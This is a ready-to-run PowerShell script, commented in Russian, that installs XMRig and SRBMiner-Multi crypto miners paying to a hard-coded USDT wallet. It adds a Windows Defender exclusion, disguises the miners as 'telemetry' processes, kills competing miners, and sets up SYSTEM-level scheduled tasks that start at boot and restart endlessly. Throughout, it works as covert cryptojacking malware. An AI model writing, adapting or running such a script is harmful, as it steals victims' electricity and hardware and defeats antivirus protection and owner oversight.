# === НАСТРОЙКИ ===
$Coin = "USDT"
$Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
$RefCode = "rbi3-l12f"                   # Реферальный код unMineable
$CpuPool = "rx.unmineable.com:3333"
$GpuPool = "kawpow.unmineable.com:3333"
$MaxCpuUsage = 60                      # Лимит потоков CPU (%)
$EnableGpu = $true                     # Пробовать запускать GPU (включая встроенную графику)

$InstallDir = "C:\ProgramData\SysWorker"
$CpuTaskName = "telemetry-host"
$GpuTaskName = "telemetry-gpu"
$CpuExeName = "telemetry-host.exe"
$GpuExeName = "telemetry-gpu.exe"

$XmrigVer = "6.27.0"
# =================

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BaseWorker = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '')
$CpuWorker = "$BaseWorker-CPU"
$GpuWorker = "$BaseWorker-GPU"

$CpuUser = "$Coin`:$Wallet.$CpuWorker"
$GpuUser = "$Coin`:$Wallet.$GpuWorker"
if ($RefCode -ne "") {
    $CpuUser = "$CpuUser#$RefCode"
    $GpuUser = "$GpuUser#$RefCode"
}

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 1. Исключения в Windows Defender до скачивания
try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
} catch {}

# 2. Останавливаем старые процессы и задачи
foreach ($t in @($CpuTaskName, $GpuTaskName, "SysBackgroundWorker")) {
    try { Stop-ScheduledTask -TaskName $t -ErrorAction SilentlyContinue } catch {}
}
Get-Process -Name "telemetry-host", "telemetry-gpu", "xmrig", "SRBMiner-MULTI" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 3. Скачиваем и распаковываем XMRig (CPU + RAM HugePages)
$CpuExePath = "$InstallDir\$CpuExeName"
$XmrigZip = "$InstallDir\xmrig.zip"
$XmrigTmp = "$InstallDir\xmrig_tmp"
$XmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-windows-x64.zip"

Invoke-WebRequest -Uri $XmrigUrl -OutFile $XmrigZip
Expand-Archive -Path $XmrigZip -DestinationPath $XmrigTmp -Force
$FoundXmrig = Get-ChildItem -Path $XmrigTmp -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if (-not $FoundXmrig) { throw "Не найден xmrig.exe в архиве." }
Move-Item -Path $FoundXmrig.FullName -Destination $CpuExePath -Force
Remove-Item -Path $XmrigZip, $XmrigTmp -Recurse -Force

# Конфиг XMRig с поддержкой HugePages (эффективная работа с ОЗУ)
$CpuConfig = @"
{
    "autosave": true,
    "randomx": {
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "max-threads-hint": $MaxCpuUsage,
        "priority": 1
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$CpuPool",
            "user": "$CpuUser",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
"@
$Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText("$InstallDir\cpu_config.json", $CpuConfig, $Utf8NoBom)

# Регистрируем и запускаем задачу CPU
$CpuAction = New-ScheduledTaskAction -Execute $CpuExePath -Argument "-c cpu_config.json" -WorkingDirectory $InstallDir
$StartupTrigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

Unregister-ScheduledTask -TaskName $CpuTaskName -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName $CpuTaskName -Action $CpuAction -Trigger $StartupTrigger -Principal $Principal -Settings $Settings -Force | Out-Null
Start-ScheduledTask -TaskName $CpuTaskName

# 4. Скачиваем и настраиваем SRBMiner-Multi для любых GPU (актуальный релиз через GitHub API)
$GpuAvailable = $false
if ($EnableGpu) {
    $GpuControllers = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    if ($GpuControllers) {
        $GpuExePath = "$InstallDir\$GpuExeName"
        $SrbZip = "$InstallDir\srbminer.zip"
        $SrbTmp = "$InstallDir\srb_tmp"

        try {
            $Headers = @{ "User-Agent" = "PowerShell-Deployer" }
            $Release = Invoke-RestMethod -Uri "https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest" -Headers $Headers
            $Asset = $Release.assets | Where-Object { $_.name -match 'win64\.zip$' } | Select-Object -First 1
            if (-not $Asset) { throw "Не найден win64.zip ассет в последнем релизе SRBMiner-Multi." }

            Invoke-WebRequest -Uri $Asset.browser_download_url -OutFile $SrbZip
            Expand-Archive -Path $SrbZip -DestinationPath $SrbTmp -Force
            $FoundSrb = Get-ChildItem -Path $SrbTmp -Filter "*SRBMiner*.exe" -Recurse | Select-Object -First 1
            if ($FoundSrb) {
                Move-Item -Path $FoundSrb.FullName -Destination $GpuExePath -Force
                $GpuArgs = "--algorithm kawpow --pool $GpuPool --wallet $GpuUser --password x --cpu-threads 0 --gpu-opencl-enable --gpu-cuda-enable --disable-cpu-mining"

                $GpuAction = New-ScheduledTaskAction -Execute $GpuExePath -Argument $GpuArgs -WorkingDirectory $InstallDir
                Unregister-ScheduledTask -TaskName $GpuTaskName -Confirm:$false -ErrorAction SilentlyContinue
                Register-ScheduledTask -TaskName $GpuTaskName -Action $GpuAction -Trigger $StartupTrigger -Principal $Principal -Settings $Settings -Force | Out-Null
                Start-ScheduledTask -TaskName $GpuTaskName
                $GpuAvailable = $true
            }
        } catch {
            Write-Warning "GPU-модуль не удалось запустить: $($_.Exception.Message)"
        } finally {
            Remove-Item -Path $SrbZip, $SrbTmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Start-Sleep -Seconds 3
Write-Host "Готово. CPU-воркер: $CpuWorker | GPU-запущен: $GpuAvailable" -ForegroundColor Green
Get-Process -Name "telemetry-host", "telemetry-gpu" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
